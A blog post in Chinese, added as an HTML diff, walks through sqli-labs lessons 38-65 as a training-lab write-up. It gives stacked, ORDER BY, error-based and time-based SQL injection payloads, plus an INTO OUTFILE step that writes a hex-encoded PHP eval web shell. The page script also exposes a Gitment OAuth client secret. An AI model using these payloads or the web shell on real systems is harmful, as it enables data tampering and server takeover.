@@ -1,0 +1,426 @@
+<!DOCTYPE html>
+<html>
+  <head>
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+  <meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport">
+  <meta name="description" content="osword&#39;s blog">
+  <meta name="keyword" content="hexo-theme, vuejs">
+  
+    <link rel="shortcut icon" href="/css/images/logo.png">
+  
+  <title>
+    
+      sqlilabs38-65 | osword&#39;s blog
+    
+  </title>
+  <link href="//cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css" rel="stylesheet">
+  <link href="//cdnjs.cloudflare.com/ajax/libs/nprogress/0.2.0/nprogress.min.css" rel="stylesheet">
+  <link href="//cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/styles/tomorrow.min.css" rel="stylesheet">
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+    
+<link rel="stylesheet" href="/css/plugins/gitment.css">
+
+  
+  <script src="//cdnjs.cloudflare.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
+  <script src="//cdnjs.cloudflare.com/ajax/libs/geopattern/1.2.3/js/geopattern.min.js"></script>
+  <script src="//cdnjs.cloudflare.com/ajax/libs/nprogress/0.2.0/nprogress.min.js"></script>
+  
+  
+    
+<script src="/js/gitment.js"></script>
+
+  
+  
+  
+    <!-- MathJax support START -->
+    <script type="text/x-mathjax-config">
+      MathJax.Hub.Config({
+        tex2jax: {
+          inlineMath: [ ['$','$'], ["\\(","\\)"]  ],
+          processEscapes: true,
+          skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
+        }
+      });
+    </script>
+
+    <script type="text/x-mathjax-config">
+      MathJax.Hub.Queue(function() {
+        var all = MathJax.Hub.getAllJax(), i;
+        for (i=0; i < all.length; i += 1) {
+          all[i].SourceElement().parentNode.className += ' has-jax';
+        }
+      });
+    </script>
+    <script type="text/javascript" src="//cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
+    <!-- MathJax support END -->
+  
+
+
+  
+<meta name="generator" content="Hexo 4.2.1"></head>
+<div class="wechat-share">
+  <img src="/css/images/logo.png" />
+</div>
+
+  <body>
+    <header class="header fixed-header">
+  <div class="header-container">
+    <a class="home-link" href="/">
+      <div class="logo"></div>
+      <span>osword's blog</span>
+    </a>
+    <ul class="right-list">
+      
+        <li class="list-item">
+          
+            <a href="/" class="item-link">Home</a>
+          
+        </li>
+      
+        <li class="list-item">
+          
+            <a href="/links/" class="item-link">Links</a>
+          
+        </li>
+      
+        <li class="list-item">
+          
+            <a href="/archives/" class="item-link">Archives</a>
+          
+        </li>
+      
+        <li class="list-item">
+          
+            <a href="/project/" class="item-link">Projects</a>
+          
+        </li>
+      
+        <li class="list-item">
+          
+            <a href="/about/" class="item-link">About</a>
+          
+        </li>
+      
+    </ul>
+    <div class="menu">
+      <span class="icon-bar"></span>
+      <span class="icon-bar"></span>
+      <span class="icon-bar"></span>
+    </div>
+    <div class="menu-mask">
+      <ul class="menu-list">
+        
+          <li class="menu-item">
+            
+              <a href="/" class="menu-link">Home</a>
+            
+          </li>
+        
+          <li class="menu-item">
+            
+              <a href="/links/" class="menu-link">Links</a>
+            
+          </li>
+        
+          <li class="menu-item">
+            
+              <a href="/archives/" class="menu-link">Archives</a>
+            
+          </li>
+        
+          <li class="menu-item">
+            
+              <a href="/project/" class="menu-link">Projects</a>
+            
+          </li>
+        
+          <li class="menu-item">
+            
+              <a href="/about/" class="menu-link">About</a>
+            
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</header>
+
+    <div id="article-banner">
+  <h2>sqlilabs38-65</h2>
+  <p class="post-date">2018-12-23 - 
+<span id="busuanzi_container_page_pv" style="color: #fff; margin-left: 0px">阅读量<span id="busuanzi_value_page_pv"></span>次
+        </span></p>
+<div class="arrow-down">
+    <a href="javascript:;"></a>
+  </div>
+</div>
+<main class="app-body flex-box">
+  <!-- Article START -->
+  <article class="post-article">
+    <section class="markdown-content"><h1 id="0x01堆栈查询"><a href="#0x01堆栈查询" class="headerlink" title="0x01堆栈查询"></a>0x01堆栈查询</h1><h2 id="堆栈查询解析"><a href="#堆栈查询解析" class="headerlink" title="堆栈查询解析"></a>堆栈查询解析</h2><p>堆栈查询，说白了就是在加一个查询语句。但个人认为union 联合注入比较靠谱。</p>
+<p>局限性：</p>
+<ol>
+<li>堆叠注入第二个语句产生错误或者结果只能被忽略，我们在前端界面是无法看到返回结果的。 所以延时注入，差错注入都行不通。</li>
+<li>条件是使用了<code>mysql_multi_query()</code>//为了验证数据库而使用</li>
+</ol>
+<h2 id="less38-39"><a href="#less38-39" class="headerlink" title="less38-39"></a>less38-39</h2><p>less38字符型，less39数字型注入</p>
+<p>以less38为例<br>构造payload:<code>1&#39;;insert into users values (&#39;39&#39;,&#39;osowrd&#39;,&#39;osowrd&#39;)--+</code><br>成功插入新数据，<code>38 osword osword</code><br>notice：id列数值尽量大，考虑表没有对id添加自增属性<br><img src="./1.png" alt=""></p>
+<h2 id="less40-41"><a href="#less40-41" class="headerlink" title="less40-41"></a>less40-41</h2><ul>
+<li>less40&gt;&gt;注入类型：id=1’)–+  .错误不回显，</li>
+<li>less41&gt;&gt;注入类型：id=1–+,错误不回显，</li>
+</ul>
+<h2 id="less42-45"><a href="#less42-45" class="headerlink" title="less42-45"></a>less42-45</h2><p>42~45都是相同的，区别就是过滤的形式不一样。<br>以less42讲解<br>源码分析:对登陆账户使用<code>mysql_real_escape_string()</code>过滤。<br>而登陆密码却无过滤<br><img src="./2.png" alt=""><br>构造stack injection</p>
+<p><code>admin=admin</code><br><code>passwd=c&#39;;insert into users values (&#39;40&#39;,&#39;less42&#39;,&#39;less42&#39;)#</code></p>
+<p>成功插入<br><img src="./3.png" alt=""></p>
+<h1 id="0x02-order-by-注入"><a href="#0x02-order-by-注入" class="headerlink" title="0x02 order by 注入"></a>0x02 order by 注入</h1><p>从mysql帮助文档可知，<code>order by</code> 后可以添加表达式。可以采用报错注入，延时注入<br><img src="./4.png" alt=""><br><img src="./5.png" alt=""></p>
+<h2 id="参数注入"><a href="#参数注入" class="headerlink" title="参数注入"></a>参数注入</h2><h3 id="less46"><a href="#less46" class="headerlink" title="less46"></a>less46</h3><p>借用 <code>order by</code> 后参数注入</p>
+<ol>
+<li>添加注入语句，<code>?sort=(select *****)</code>//需要注意的是sort争对单列来排序，所以select 后检索个数为1.</li>
+<li>利用函数，如rand(),随机出其他字段值<br><code>rand(trure),rand(false)</code>值不同判断条件语句<br><code>?sort=rand(ascii(substr(database()1,1,))=115)</code><br><code>?sort=rand(ascii(substr(database(),1,1))=114)</code></li>
+<li>利用<code>and</code>&gt;&gt; <code>?sort=1 and （加sql语句）</code><br><img src="./6.png" alt=""><br><img src="./7.png" alt=""></li>
+</ol>
+<h3 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h3><blockquote>
+<blockquote>
+<p><code>?sort=(select  count(*) from information_schema.columns group by  concat(0x7e,(select user()),0x7e,floor(rand(0)*2)))</code><br><img src="./8.png" alt=""></p>
+</blockquote>
+</blockquote>
+<h3 id="延时注入"><a href="#延时注入" class="headerlink" title="延时注入"></a>延时注入</h3><p>?sort=(IF(ascii(substr(database(),1,1))=114),1,sleep(5))//故意整错看效果<br><img src="./9.png" alt=""></p>
+<h3 id="函数注入判断"><a href="#函数注入判断" class="headerlink" title="函数注入判断"></a>函数注入判断</h3><p>rand()&gt;&gt;rand(true) / rand(false)//有表单显示才能判断<br>搭配:<code>?sort=1 and</code> 盲注操作。</p>
+<h2 id="procedure-analyse-注入"><a href="#procedure-analyse-注入" class="headerlink" title="procedure analyse 注入"></a>procedure analyse 注入</h2><p>prodedure analyse在windows下可执行，ubuntu mysql 5.7执行不了，具体原因未可知。<br>windows环境下<br><code>?sort procedure analyse(extractvalue(1,concat(0x3a,database())),1)</code><br><img src="./10.png" alt=""><br><img src="./11.png" alt=""></p>
+<h2 id="导入导出文件"><a href="#导入导出文件" class="headerlink" title="导入导出文件"></a>导入导出文件</h2><p><img src="./12.png" alt=""><br><code>?sort=1  into outfile &#39;F:\\phpstudy\\PHPTutorial\\WWW\\sqlilabs\\Less-46\\1.php&#39;</code><br><img src="./13.png" alt=""><br><img src="./14.png" alt=""></p>
+<h3 id="一句话木马"><a href="#一句话木马" class="headerlink" title="一句话木马"></a>一句话木马</h3><p>利用 <code>lines terminated by</code><br>payload: <code>?sort=1 into outfile &#39;F:\\phpstudy\\PHPTutorial\\WWW\\sqlilabs\\Less-46\\less46.php&#39; lines terminated by 3c3f70687020406576616c28245f504f53545b276d696d61275d293f3e</code><br><img src="./15.png" alt=""><br><img src="./16.png" alt=""></p>
+<h2 id="less47-49-见解"><a href="#less47-49-见解" class="headerlink" title="less47-49(见解)"></a>less47-49(见解)</h2><p>基于无错误返回进行注入。延时，盲注都行的通就不一一写了<br>见解：<code>sort=rand()</code>可以判断是否可以添加<code>(select **)</code>和判断整型，<br>若是字符串只能用<code>and</code>注入，或<code>procedure analyse()</code></p>
+<h2 id="less50-53"><a href="#less50-53" class="headerlink" title="less50-53"></a>less50-53</h2><p>PHP中使用了mysql_multi_query()函数，使得能够使用堆栈注入。这里就不演示了</p>
+<h1 id="0x03-challenge"><a href="#0x03-challenge" class="headerlink" title="0x03 challenge"></a>0x03 challenge</h1><h2 id="less54-65-challenge"><a href="#less54-65-challenge" class="headerlink" title="less54-65(challenge)"></a>less54-65(challenge)</h2><p>实则就是增加了对查询次数限制<br>小BUG：页面后退就不会添加查询次数了<br>爆表名&gt;&gt;列名&gt;&gt;得出字段<br>yaon9gl5wo<br><img src="./17.png" alt=""></p>
+<p>secret_N3BG<br><img src="./18.png" alt=""></p>
+<p>RSIG77DiEpN3UnUgnRgVd5wC<br><img src="./19.png" alt=""><br>往后的就是对less54各种变形就不一一写了。</p>
+<h1 id="0x04年终总结"><a href="#0x04年终总结" class="headerlink" title="0x04年终总结"></a>0x04年终总结</h1><ul>
+<li>通过sqlilabs了解了基本的注入方法</li>
+<li>掌握了浏览器和tomact、数据库交互过程</li>
+<li>用python脚本进行sql注入编写能够更准确掌握和理解sql语句</li>
+<li>基本看了每个less源代码，学习php与数据库交互的形式和逻辑。<br>……………………………..</li>
+</ul>
+</section>
+    <!-- Tags START -->
+    
+      <div class="tags">
+        <span>Tags:</span>
+        
+  <a href="/tags#SQL注入" >
+    <span class="tag-code">SQL注入</span>
+  </a>
+
+      </div>
+    
+    <!-- Tags END -->
+    <!-- NAV START -->
+    
+  <div class="nav-container">
+    <!-- reverse left and right to put prev and next in a more logic postition -->
+    
+      <a class="nav-left" href="/2018/12/22/sqlilabs23-28/">
+        <span class="nav-arrow">← </span>
+        
+          sqlilabs23-28
+        
+      </a>
+    
+    
+      <a class="nav-right" href="/2018/12/27/DVWA%E7%B3%BB-Command-Injection/">
+        
+          DVWA_(Command Injection)
+        
+        <span class="nav-arrow"> →</span>
+      </a>
+    
+  </div>
+
+    <!-- NAV END -->
+    <!-- 打赏 START -->
+    
+      <div class="money-like">
+        <div class="reward-btn">
+          赏
+          <span class="money-code">
+            <span class="alipay-code">
+              <div class="code-image"></div>
+              <b>使用支付宝打赏</b>
+            </span>
+            <span class="wechat-code">
+              <div class="code-image"></div>
+              <b>使用微信打赏</b>
+            </span>
+          </span>
+        </div>
+        <p class="notice">若你觉得我的文章对你有帮助，欢迎点击上方按钮对我打赏</p>
+      </div>
+    
+    <!-- 打赏 END -->
+    <!-- 二维码 START -->
+    
+    <!-- 二维码 END -->
+    
+      <!-- Gitment START -->
+      <div id="comments"></div>
+      <!-- Gitment END -->
+    
+  </article>
+  <!-- Article END -->
+  <!-- Catalog START -->
+  
+    <aside class="catalog-container">
+  <div class="toc-main">
+    <strong class="toc-title">Catalog</strong>
+    
+      <ol class="toc-nav"><li class="toc-nav-item toc-nav-level-1"><a class="toc-nav-link" href="#0x01堆栈查询"><span class="toc-nav-text">0x01堆栈查询</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#堆栈查询解析"><span class="toc-nav-text">堆栈查询解析</span></a></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#less38-39"><span class="toc-nav-text">less38-39</span></a></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#less40-41"><span class="toc-nav-text">less40-41</span></a></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#less42-45"><span class="toc-nav-text">less42-45</span></a></li></ol></li><li class="toc-nav-item toc-nav-level-1"><a class="toc-nav-link" href="#0x02-order-by-注入"><span class="toc-nav-text">0x02 order by 注入</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#参数注入"><span class="toc-nav-text">参数注入</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#less46"><span class="toc-nav-text">less46</span></a></li><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#报错注入"><span class="toc-nav-text">报错注入</span></a></li><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#延时注入"><span class="toc-nav-text">延时注入</span></a></li><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#函数注入判断"><span class="toc-nav-text">函数注入判断</span></a></li></ol></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#procedure-analyse-注入"><span class="toc-nav-text">procedure analyse 注入</span></a></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#导入导出文件"><span class="toc-nav-text">导入导出文件</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#一句话木马"><span class="toc-nav-text">一句话木马</span></a></li></ol></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#less47-49-见解"><span class="toc-nav-text">less47-49(见解)</span></a></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#less50-53"><span class="toc-nav-text">less50-53</span></a></li></ol></li><li class="toc-nav-item toc-nav-level-1"><a class="toc-nav-link" href="#0x03-challenge"><span class="toc-nav-text">0x03 challenge</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#less54-65-challenge"><span class="toc-nav-text">less54-65(challenge)</span></a></li></ol></li><li class="toc-nav-item toc-nav-level-1"><a class="toc-nav-link" href="#0x04年终总结"><span class="toc-nav-text">0x04年终总结</span></a></li></ol>
+    
+  </div>
+</aside>
+  
+  <!-- Catalog END -->
+</main>
+
+<script>
+  (function () {
+    var url = 'http://zhzhdoai.github.io/2018/12/23/sqlilabs38-65/';
+    var banner = ''
+    if (banner !== '' && banner !== 'undefined' && banner !== 'null') {
+      $('#article-banner').css({
+        'background-image': 'url(' + banner + ')'
+      })
+    } else {
+      $('#article-banner').geopattern(url)
+    }
+    $('.header').removeClass('fixed-header')
+
+    // error image
+    $(".markdown-content img").on('error', function() {
+      $(this).attr('src', 'http://file.muyutech.com/error-img.png')
+      $(this).css({
+        'cursor': 'default'
+      })
+    })
+
+    // zoom image
+    $(".markdown-content img").on('click', function() {
+      var src = $(this).attr('src')
+      if (src !== 'http://file.muyutech.com/error-img.png') {
+        var imageW = $(this).width()
+        var imageH = $(this).height()
+
+        var zoom = ($(window).width() * 0.95 / imageW).toFixed(2)
+        zoom = zoom < 1 ? 1 : zoom
+        zoom = zoom > 2 ? 2 : zoom
+        var transY = (($(window).height() - imageH) / 2).toFixed(2)
+
+        $('body').append('<div class="image-view-wrap"><div class="image-view-inner"><img src="'+ src +'" /></div></div>')
+        $('.image-view-wrap').addClass('wrap-active')
+        $('.image-view-wrap img').css({
+          'width': `${imageW}`,
+          'transform': `translate3d(0, ${transY}px, 0) scale3d(${zoom}, ${zoom}, 1)`
+        })
+        $('html').css('overflow', 'hidden')
+
+        $('.image-view-wrap').on('click', function() {
+          $(this).remove()
+          $('html').attr('style', '')
+        })
+      }
+    })
+  })();
+</script>
+
+
+
+
+  <script>
+    var gitmentConfig = "osword";
+    if (gitmentConfig !== 'undefined') {
+      var gitment = new Gitment({
+        id: "sqlilabs38-65",
+        owner: "osword",
+        repo: "osword.github.io",
+        oauth: {
+          client_id: "7d7576c71632f14d639a",
+          client_secret: "3d7f7e4c0e9a43a2cc5334d68aee612090df8b70"
+        },
+        theme: {
+          render(state, instance) {
+            const container = document.createElement('div')
+            container.lang = "en-US"
+            container.className = 'gitment-container gitment-root-container'
+            container.appendChild(instance.renderHeader(state, instance))
+            container.appendChild(instance.renderEditor(state, instance))
+            container.appendChild(instance.renderComments(state, instance))
+            container.appendChild(instance.renderFooter(state, instance))
+            return container;
+          }
+        }
+      })
+      gitment.render(document.getElementById('comments'))
+    }
+  </script>
+
+
+
+
+    <div class="scroll-top">
+  <span class="arrow-icon"></span>
+</div>
+    <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+<footer class="app-footer">
+  <p class="copyright">
+    &copy; 2020 | Proudly powered by <a href="https://hexo.io" target="_blank">Hexo</a>
+    <br>
+    Theme by <a href="https://github.com/yanm1ng" target="_blank" rel="noopener">yanm1ng</a>
+  </p>
+    访问量<span id="busuanzi_value_site_pv"></span>,
+    访客数<span id="busuanzi_value_site_uv"></span>
+</footer>
+
+<script>
+  function async(u, c) {
+    var d = document, t = 'script',
+      o = d.createElement(t),
+      s = d.getElementsByTagName(t)[0];
+    o.src = u;
+    if (c) { o.addEventListener('load', function (e) { c(null, e); }, false); }
+    s.parentNode.insertBefore(o, s);
+  }
+</script>
+<script>
+  async("//cdnjs.cloudflare.com/ajax/libs/fastclick/1.0.6/fastclick.min.js", function(){
+    FastClick.attach(document.body);
+  })
+</script>
+
+<script>
+  var hasLine = 'true';
+  async("//cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/highlight.min.js", function(){
+    $('figure pre').each(function(i, block) {
+      var figure = $(this).parents('figure');
+      if (hasLine === 'false') {
+        figure.find('.gutter').hide();
+      }
+      var lang = figure.attr('class').split(' ')[1] || 'code';
+      var codeHtml = $(this).html();
+      var codeTag = document.createElement('code');
+      codeTag.className = lang;
+      codeTag.innerHTML = codeHtml;
+      $(this).attr('class', '').empty().html(codeTag);
+      figure.attr('data-lang', lang.toUpperCase());
+      hljs.highlightBlock(block);
+    });
+  })
+</script>
+<!-- Baidu Tongji -->
+
+
+<script src="/js/script.js"></script>
+
+
+  </body>
+</html>
